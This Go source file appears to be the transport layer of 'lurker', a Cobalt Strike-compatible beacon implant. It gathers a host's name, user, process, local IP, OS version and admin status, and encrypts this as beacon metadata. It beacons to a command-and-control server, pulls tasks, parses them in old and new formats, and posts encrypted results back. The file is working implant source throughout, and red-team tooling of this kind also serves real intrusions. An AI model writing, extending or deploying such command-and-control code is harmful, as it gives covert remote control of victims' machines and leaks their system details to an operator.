package transports

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"
	"time"
	"net/http"

	"lurker/lurker/constants"
	"lurker/lurker/cryptography"
	"lurker/lurker/os"
	"lurker/lurker/utilities"
)

var (
	encryptedMetaInfo string
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func DecryptPacket(b []byte) ([]byte, error) {
	decrypted, err := cryptography.AesCBCDecrypt(b, constants.AesKey)
	if err != nil {
		return nil, err
	}
	return decrypted, nil
}

// Parse the task buffer with a given headerLen
func validateTaskLayout(taskData []byte, totalLen uint32, headerLen int) (int, bool) {
	offset := 0
	taskCount := 0
	dataLen := int(totalLen)

	for offset+8 <= dataLen {
		cmdID := binary.BigEndian.Uint32(taskData[offset : offset+4])
		cmdDataLen := int(binary.BigEndian.Uint32(taskData[offset+4 : offset+8]))
		offset += 8

		if cmdID == 0 || cmdID > 0xFFFF {
			return 0, false
		}

		if headerLen+cmdDataLen > dataLen-offset {
			return 0, false
		}

		offset += headerLen + cmdDataLen
		taskCount++
	}

	return taskCount, taskCount > 0 && offset == dataLen
}

//Try new and older task formats and pray one works
func DetectTaskHeaderLen(taskData []byte, totalLen uint32) int {
	_, v2Valid := validateTaskLayout(taskData, totalLen, 8)
	_, v1Valid := validateTaskLayout(taskData, totalLen, 0)

	if v2Valid && !v1Valid {
		return 8
	} else if v1Valid && !v2Valid {
		return 0
	} else if v2Valid && v1Valid {
		// Ambiguous: prefer newer layout
		return 8
	}
	// Neither layout valid — default to 0 and let parsing try its best
	return 0
}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32, taskHeaderLen int) (uint32, [8]byte, []byte, error) {
	var taskID [8]byte

	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		return 0, taskID, nil, fmt.Errorf("reading command type: %w", err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		return 0, taskID, nil, fmt.Errorf("reading command length: %w", err)
	}
	commandLen := ReadInt(commandLenBytes)

	// Read per-task header if present (CS 4.12+)
	if taskHeaderLen > 0 {
		headerBytes := make([]byte, taskHeaderLen)
		_, err = buf.Read(headerBytes)
		if err != nil {
			return 0, taskID, nil, fmt.Errorf("reading task header: %w", err)
		}
		copy(taskID[:], headerBytes[:8])
	}

	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		return 0, taskID, nil, fmt.Errorf("reading command data: %w", err)
	}
	*totalLen -= (4 + 4 + uint32(taskHeaderLen) + commandLen)

	return commandType, taskID, commandBuf, nil
}

func MakePacket(replyType int, taskID [8]byte, b []byte) []byte {
	constants.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(constants.Counter))
	buf.Write(counterBytes)

	// resultLen = 4 (replyType) + 8 (taskID) + len(data)
	dataLen := len(b)
	resultLen := 4 + 8 + dataLen
	resultLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
	buf.Write(resultLenBytes)

	// OR the reply type with MSB flag (0x80000000) for CS 4.12
	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType)|0x80000000)
	buf.Write(replyTypeBytes)

	// Prepend task ID before data
	buf.Write(taskID[:])
	buf.Write(b)

	encrypted, err := cryptography.AesCBCEncrypt(buf.Bytes(), constants.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + cryptography.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := cryptography.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()
}

var resultQueue [][]byte

func QueueResult(packet []byte) {
	resultQueue = append(resultQueue, packet)
}

func FlushResults() {
	if len(resultQueue) == 0 {
		return
	}
	var combined []byte
	for _, p := range resultQueue {
		combined = append(combined, p...)
	}
	url := constants.PostUrl
	id := strconv.Itoa(clientID)
	HttpPost(url, id, combined)
	resultQueue = nil
}

func EncryptedMetaInfo() string {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := cryptography.RsaEncrypt(packetUnencrypted)
	if err != nil {
		panic(err)
	}

	finalPacket := base64.RawURLEncoding.EncodeToString(packetEncrypted)
	return finalPacket
}

/*
MetaData for 4.1

	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
func MakeMetaInfo() []byte {
	cryptography.RandomAESKey()
	sha256hash := sha256.Sum256(constants.GlobalKey)
	constants.AesKey = sha256hash[:16]
	constants.HmacKey = sha256hash[16:]

	clientID = os.SessionID()
	processID := os.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := os.GetMetaDataFlag()
	//for OS Version
	osVersion := os.GetOSVersion()
	osVersion = strings.TrimSpace(osVersion)
	// Strip kernel suffix like "-91-generic" from "5.15.0-91-generic"
	if dashIdx := strings.Index(osVersion, "-"); dashIdx > 0 {
		osVersion = osVersion[:dashIdx]
	}
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}

	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := os.GetProcessName()
	localIP := os.GetLocalIPInt()
	hostName := os.GetComputerName()
	currentUser := os.GetUsername()

	localeANSI := os.GetCodePageANSI()
	localeOEM := os.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = byte(metadataFlag)
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	// Cap info string to 58 bytes — max for 1024-bit RSA key (117 - 59 fixed fields)
	// Truncate process name instead of previous hostname - less important
	if len(osInfo) > 58 {
		osInfo = osInfo[:58]
	}
	osInfoBytes := []byte(osInfo)

	onlineInfoBytes := utilities.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := utilities.BytesCombine(constants.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := os.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := utilities.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func InitialCallback() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
		if resp != nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(constants.SleepTime)
	return true
}

func PullCommand() *http.Response {
	resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
	return resp
}

